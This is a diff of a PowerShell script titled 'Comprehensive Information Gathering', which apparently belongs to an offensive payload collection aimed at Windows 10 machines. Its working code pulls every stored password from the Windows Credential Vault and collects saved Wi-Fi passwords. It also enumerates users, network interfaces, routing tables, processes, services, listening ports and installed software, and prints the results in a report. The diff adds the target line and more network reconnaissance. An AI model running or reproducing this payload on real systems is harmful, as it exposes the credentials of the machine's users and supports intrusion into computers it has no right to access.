@@ -1,13 +1,11 @@
 
 #Author     : 0rion5 B3lt, (original creator Simen Kjeserud), Gachnang, Dannyk999
-
-#Version    : 2.1
-
+#Version    : v2.1
 #Title      : Comprehensive Information Gathering
-
-#Description: Gathers all sorts of information of the Attack surface. Collects information like OS, Vendor, 
+#Target     : Windows 10
+#Description: Gathers all sorts of information on the target. Collects information like OS, Vendor, 
 #Network Information, Hardware Details, Software Details, Process Details, WIFI passwords, USB device VID & PID, System BIOS Etc...
-#  
+ 
 
 #################################################
 #           Get - Basic Information
@@ -33,9 +31,11 @@ $LocalUser = Get-WmiObject Win32_UserAccount | Select-Object Name, Caption, SID,
 $Vault = New-Object Windows.Security.Credentials.PasswordVault 
 $Vault = $Vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword();$_ }
 
+
 #################################################
 #           Get - Network Info                  #
 #################################################
+
 
 #Get - wifi SSIDs and Passwords	
 $WLANProfileNames = @()
@@ -84,7 +84,7 @@ catch {
 #Get - Computer IP (Usually the Ethernet Ip or the first IP after the Wireless IP.)
 $ComputerIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPAddress.Length -gt 0} 
 
-#Filter For MAC ADDRESS
+#Filter For MAC Address
 $Networks =  Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | Where-Object {$_.IPEnabled}
 $IsDHCPEnabled = $false
 
@@ -98,9 +98,17 @@ foreach ($Network in $Networks) {
 #Get - Network Interface IPs
 $IPAddress = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled=$True" | Where-Object {$_.IPEnabled} | Select-Object ServiceName, DHCPEnabled, DefaultIPGateway, IPAddress, MACaddress, Index, Description | Format-Table 
 
+#Get - Network Interfaces
+$NetworkAdapter = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -notlike $null }  | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress -Wrap
+
+#Get -Routing Table
+$RoutingTable = Get-NetRoute | Where-Object {$_.AddressFamily -eq "IPv4"} | Select-Object InterfaceAlias, Protocol, DestinationPrefix,InterfaceMetric, InterfaceIndex, NextHop | Sort-Object InterfaceIndex | Format-Table
+
+
 #################################################
 #Get - Other Hardware Details (Com Ports, SD-Card readers, Hard Drives, RAM, CPU Etc.)
 #################################################
+
 
 #Get - Installed CPU Info
 $BIOS = Get-CIMInstance win32_bios
@@ -137,6 +145,7 @@ $HDDs = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{
 #Get - Com & Serial Devices
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table -Wrap
 
+
 #################################################
 #           Get - Software Details              #
 #################################################
@@ -172,9 +181,11 @@ $Software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uni
 #Get - Drivers
 $Drivers = Get-WmiObject Win32_PnPSignedDriver| Where-Object { $_.DeviceName -notlike $null } | Select-Object DeviceName, FriendlyName, DriverProviderName | Sort-Object DriverProviderName | Format-Table -wrap 
 
+
 ###############################################################################################################################################
 #OUTPUT FIELD\\\\\\\\\\////////////OUTPUT FIELD///////////\\\\\\\\\\\\\OUTPUT FIELD\\\\\\\\\\////////////OUTPUT FIELD///////////\\\\\\\\\\\\\\#
 ###############################################################################################################################################
+
 
 Clear-Host
 Start-Sleep -Seconds 1
@@ -194,9 +205,6 @@ Write-Host
 "Install date                  : " + $InstallDate
 "Last Boot                     : " + $LastBootTime
 "Local Time                    : " + $LocalTime
-
-"" +
-"" + 
 ""
 "SYSTEM PRODUCT DETAILS"
 "=================================================================="
@@ -226,8 +234,14 @@ $Vault | Select-Object Resource, UserName, Password | Sort-Object Resource | For
 "WLAN PROFILES: "
 "=================================================================="+ ($WLANProfileObjects| Out-String)
 ""
-"NETWORK INTERFACE DETAILS: "
+"CURRENT NETWORK INTERFACE DETAILS: "
 "==================================================================" + ($IPAddress | Out-String)
+""
+"ALL NETWORK INTERFACE DETAILS: "
+"==================================================================" + ($NetworkAdapter | Out-String)
+""
+"ROUTING TABLE DETAILS: "
+"==================================================================" + ($RoutingTable | Out-String)
 ""
 "=================================================================="
 "========================HARDWARE DETAILS=========================="
@@ -261,18 +275,15 @@ $Vault | Select-Object Resource, UserName, Password | Sort-Object Resource | For
 "PRINTER DETAILS: "
 "==================================================================" + ($Printers | Out-String)
 ""
-""
 "INSTALLED VIDEOCARDS: "
 "==================================================================" + ($Videocard | out-string)
 ""
 "STORAGE DETAILS: "
 "==================================================================" + ($HDDs | Out-String)
 ""
-
 "COM & SERIAL DEVICES"
 "==================================================================" + ($COMDevices | Out-String)
 ""
-
 "=================================================================="
 "========================SOFTWARE DETAILS=========================="
 "=================================================================="
@@ -293,11 +304,11 @@ $Vault | Select-Object Resource, UserName, Password | Sort-Object Resource | For
 "==================================================================" + ($Drivers| out-string)
 ""
 #################################################
-#                Get CleanUp                    #
+#                Get - Clean-Up                 #
 #################################################
-Remove-Variable -Name ComputerOS, ComputerSystem, LocalUser,
+Remove-Variable -Name WindowsExprienceScore, ComputerOS, ComputerSystem, LocalUser,
 Vault, WLANProfileNames,Output, WLANProfileName,WLANProfileObjects,
 WLANProfilePassword,WLANProfileObject,RDP,PublicIPAddress, ComputerIP,
-Networks,Network, IPAddress, BIOS, MainBoard, ComputerProcessor, 
-RAMCapacity, RAMDetails, Videocard, DriveType, HDDs, COMDevices, Process, 
+Networks,Network, IPAddress,NetworkAdapter,RoutingTable, BIOS, MainBoard, ComputerProcessor, 
+RAMCapacity, RAMDetails, Printers, Videocard, DriveType, HDDs, COMDevices, Process, 
 Listener, ListenerItem, ProcessItem, Process, Service, Software, Drivers, null -ErrorAction SilentlyContinue -Force
